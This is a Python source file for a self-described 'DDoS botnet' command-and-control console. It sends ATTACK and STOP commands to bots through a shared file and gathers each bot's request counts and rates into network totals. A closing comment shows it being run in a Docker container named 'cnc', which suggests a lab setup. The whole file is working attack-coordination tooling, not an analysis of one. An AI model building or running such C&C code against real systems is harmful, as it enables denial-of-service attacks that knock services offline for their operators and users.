import time
import os
import json
import glob
from datetime import datetime

COMMAND_FILE = "/shared/command.txt" #important file - contact file
METRICS_DIR = "/shared"

def init_command_file():
    """Initialize command file if it doesn't exist"""
    if not os.path.exists(COMMAND_FILE):
        with open(COMMAND_FILE, "w") as f:
            f.write("STOP")
        print("Command file initialized")

def send_command(cmd):
    """Send command to all bots"""
    try:
        with open(COMMAND_FILE, "w") as f:
            f.write(cmd)
        print(f" Command '{cmd}' sent to all bots")
        return True
    except Exception as e:
        print(f"Error sending command: {e}")
        return False

def get_bot_metrics():
    """Retrieve and display metrics from all bots"""
    try:
        metric_files = glob.glob(f"{METRICS_DIR}/metrics_*.json")
        
        if not metric_files:
            print("No bot metrics available yet")
            return
        
        print("\n" + "="*70)
        print(f"BOT METRICS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*70)
        
        total_requests = 0
        total_successful = 0
        total_failed = 0
        
        for metric_file in sorted(metric_files):
            try:
                with open(metric_file, "r") as f:
                    metrics = json.load(f)
                
                bot_id = metrics.get("bot_id", "unknown")
                total = metrics.get("total_requests", 0)
                successful = metrics.get("successful", 0)
                failed = metrics.get("failed", 0)
                rps = metrics.get("requests_per_second", 0)
                uptime = metrics.get("uptime_seconds", 0)
                
                total_requests += total
                total_successful += successful
                total_failed += failed
                
                print(f"\n{bot_id}:")
                print(f"  Total Requests: {total}")
                print(f"  Successful: {successful} | Failed: {failed}")
                print(f"  Requests/sec: {rps:.2f}")
                print(f"  Uptime: {uptime:.1f}s")
                
            except Exception as e:
                print(f"Error reading {metric_file}: {e}")
        
        print("\n" + "-"*70)
        print(f"TOTAL NETWORK:")
        print(f"  Total Requests: {total_requests}")
        print(f"  Successful: {total_successful} | Failed: {total_failed}")
        print(f"  Active Bots: {len(metric_files)}")
        print("="*70 + "\n")
        
    except Exception as e:
        print(f"Error retrieving metrics: {e}")

def show_help():
    """Display help menu"""
    print("\n" + "="*70)
    print("DDoS BOTNET C&C CONSOLE - Command Menu")
    print("="*70)
    print("\nAvailable Commands:")
    print("  ATTACK          - Start DDoS attack on all bots")
    print("  STOP            - Stop all bots from attacking")
    print("  STATUS / STATS  - Show bot metrics and status")
    print("  HELP            - Show this help menu")
    print("  EXIT / QUIT     - Exit C&C console")
    print("\nExample:")
    print("  > ATTACK")
    print("  > STATUS")
    print("  > STOP")
    print("="*70 + "\n")

def main():
    print("\n" + "="*70)
    print("DDoS BOTNET - Command & Control (C&C) Server")
    print("="*70)
    print("Initializing C&C Server...")
    
    init_command_file()
    print("C&C ready. Type 'HELP' for commands.\n")
    
    while True:
        try:
            user_input = input("C&C> ").strip().upper()
            
            if not user_input:
                continue
            
            if user_input in ["ATTACK", "START"]:
                send_command("ATTACK")
                print("" \
                "Attack command sent to all bots")
                time.sleep(0.5)
                
            elif user_input in ["STOP", "CANCEL"]:
                send_command("STOP")
                print(" Stop command sent to all bots")
                
            elif user_input in ["STATUS", "STATS", "METRICS"]:
                get_bot_metrics()
                
            elif user_input == "HELP":
                show_help()
                
            elif user_input in ["EXIT", "QUIT", "Q"]:
                print("Sending STOP command to all bots...")
                send_command("STOP")
                print("C&C Server shutting down. Goodbye!")
                break
                
            else:
                print(f"Unknown command: '{user_input}'. Type 'HELP' for available commands.")
            
        except KeyboardInterrupt:
            print("\n\nSending STOP command to all bots")
            send_command("STOP")
            print("C&C Server interrupted.")
            break
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()


# docker exec -it cnc python cnc.py